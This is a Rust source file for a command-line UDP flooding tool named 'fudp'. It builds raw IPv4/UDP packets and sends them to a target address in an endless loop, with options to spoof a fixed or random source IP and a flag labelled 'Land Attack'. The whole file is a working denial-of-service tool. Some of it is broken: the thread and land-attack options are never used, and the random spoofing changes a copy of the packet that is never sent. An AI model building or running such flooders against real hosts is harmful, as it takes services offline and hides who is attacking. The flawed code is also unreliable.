#[macro_use]
extern crate clap;
extern crate pnet;
extern crate rand;
extern crate spin_sleep;

use rand::Rng;
use std::str::FromStr;
use clap::{App, Arg};
use std::net::{IpAddr, Ipv4Addr};
use pnet::transport;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet;
use pnet::packet::Packet;
use pnet::packet::MutablePacket;

fn main() {
    let matches = App::new("fudp")
        .before_help("Please use responsibly")
        .version(format!("v{}", crate_version!()).as_ref())
        .author("xorrsprsp - https://github.com/xorrsprsp/")
        .about("fudp is a simple and very easy to use UDP flooding utility")
        .arg(
            Arg::with_name("dst-ip")
                .help("The IP to be targeted")
                .required(true),
        )
        .arg(
            Arg::with_name("single-packet")
                .short("1")
                .help("Sends a single datagram and then exits"),
        )
        .arg(
            Arg::with_name("random-src")
                .short("r")
                .help("Spoofs a random sender IP"),
        )
        .arg(
            Arg::with_name("threads")
                .short("i")
                .help("Spin up extra threads generating datagrams")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("dst-port")
                .short("p")
                .help("Destination port")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("payload-size")
                .short("z")
                .help("UDP payload size (Default: 0; Empty packets)")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("src-ip")
                .short("s")
                .help("Spoofs a specified source IP")
                .takes_value(true),
        )
        .arg(
            Arg::with_name("delay")
                .short("d")
                .help("Sleeps the thread for the specified time in μs before sending a new packet (Default: 0μs)")
                .takes_value(true),
        )
        .arg(Arg::with_name("land-attack").short("l").help("Land Attack"))
        .get_matches();

    let dst_ip = matches.value_of("dst-ip").unwrap();

    let src_ip = match matches.value_of("src-ip") {
        Some(source_ip) => match Ipv4Addr::from_str(source_ip) {
            Ok(ip) => ip,
            Err(err) => {
                println!("Error: {}", err);
                std::process::exit(1);
            }
        },
        None => Ipv4Addr::new(0, 0, 0, 0),
    };

    let mut dst_port = match matches.value_of("dst-port") {
        Some(destination_port) => match destination_port.parse::<u16>() {
            Ok(port) => port,
            Err(err) => {
                println!("Error while interpreting port: {}", err);
                std::process::exit(1);
            }
        },
        None => 0u16,
    };

    let payload_size = match matches.value_of("payload-size") {
        Some(size) => match size.parse::<u16>() {
            Ok(size) => size,
            Err(err) => {
                println!("Error while setting datagram size: {}", err);
                std::process::exit(1);
            }
        },
        None => 0,
    };

    let random_src = matches.is_present("random-src");
    let single_packet = matches.is_present("single-packet");

    let dst_ip = match Ipv4Addr::from_str(dst_ip) {
        Ok(ip) => ip,
        Err(err) => {
            println!("Error: {}", err);
            std::process::exit(1);
        }
    };

    let delay_enabled = matches.is_present("delay");
    let delay = match matches.value_of("delay") {
        Some(delay) => match delay.parse::<u64>() {
            Ok(delay) => delay,
            Err(err) => {
                println!("Error while setting delay: {}", err);
                std::process::exit(1);
            }
        },
        None => 0,
    };

    let delay_micro = delay * 1000;

    if !src_ip.is_unspecified() && random_src == true {
        eprintln!("ERROR: -s and -r flags are mutually exclusive");
        std::process::exit(1);
    }

    let (mut tx, _rx) = match transport::transport_channel(
        1000,
        transport::TransportChannelType::Layer3(IpNextHeaderProtocols::Udp),
    ) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => panic!("{}", e),
    };

    let mut rng = rand::thread_rng();

    let random_src_port = rng.gen::<u16>();

    if !matches.is_present("dst-port") {
        let random_dst_port = rng.gen::<u16>();
        dst_port = random_dst_port;
    }

    let udp_struct = packet::udp::Udp {
        source: random_src_port,
        destination: dst_port,
        length: 8 + payload_size, // at least 8, to hold all header data without a payload
        checksum: 0,
        payload: vec![0u8; payload_size as usize],
    };

    let mut udp_buffer = vec![0u8; 8 + payload_size as usize];
    let udp_buffer_len = udp_buffer.len() as u16;
    let mut udp_packet = packet::udp::MutableUdpPacket::new(&mut udp_buffer).unwrap();

    udp_packet.populate(&udp_struct);

    let ipv4_struct = packet::ipv4::Ipv4 {
        version: 4,
        header_length: 5, // 5 is the minimum amount of 32 bit words the IPv4 header can consist of, a larger number than 5 will enable the IPv4 options header
        dscp: 0,
        ecn: 0,
        total_length: 20 + udp_buffer_len, // 20 is the minimum amount of bytes an IPv4 packet can be (header only)
        identification: 0,
        flags: 0,
        fragment_offset: 0,
        ttl: 60,
        next_level_protocol: IpNextHeaderProtocols::Udp,
        checksum: 0,
        source: src_ip,
        destination: dst_ip,
        options: vec![],
        payload: vec![0u8; udp_buffer_len as usize],
    };

    let mut ipv4_buffer = vec![0u8; 20 + udp_buffer_len as usize];
    let mut buffer_clone = ipv4_buffer.clone();

    let mut ipv4_packet = packet::ipv4::MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();

    ipv4_packet.populate(&ipv4_struct);
    println!("{:?}", ipv4_packet);
    ipv4_packet.set_payload(udp_packet.packet());

    let spin_sleeper = spin_sleep::SpinSleeper::new(100_000_000);

    if single_packet {
        send_packets(&mut rng, &mut tx, dst_ip, &mut buffer_clone, random_src, &ipv4_packet);
    } else if delay_enabled {
        loop {
            send_packets(&mut rng, &mut tx, dst_ip, &mut buffer_clone, random_src, &ipv4_packet);

            if delay_enabled {
                spin_sleeper.sleep_ns(delay_micro);
            }
        }
    } else {
        loop {
            send_packets(&mut rng, &mut tx, dst_ip, &mut buffer_clone, random_src, &ipv4_packet);
        }
    }
}

fn send_packets(rng: &mut rand::ThreadRng, tx: &mut pnet::transport::TransportSender, dst_ip: Ipv4Addr,mut buffer_clone: &mut Vec<u8>, random_src: bool, ipv4_packet: &packet::ipv4::MutableIpv4Packet) {
    let mut cloned_packet = packet::ipv4::MutableIpv4Packet::new(&mut buffer_clone).unwrap();
    //cloned_packet.clone_from(&ipv4_packet);

    if random_src {
        let random_ipv4_addr = Ipv4Addr::new(
            rng.gen::<u8>(),
            rng.gen::<u8>(),
            rng.gen::<u8>(),
            rng.gen::<u8>(),
        );
        cloned_packet.set_source(random_ipv4_addr);
    }

    let _result = tx.send_to(ipv4_packet, IpAddr::V4(dst_ip));
}
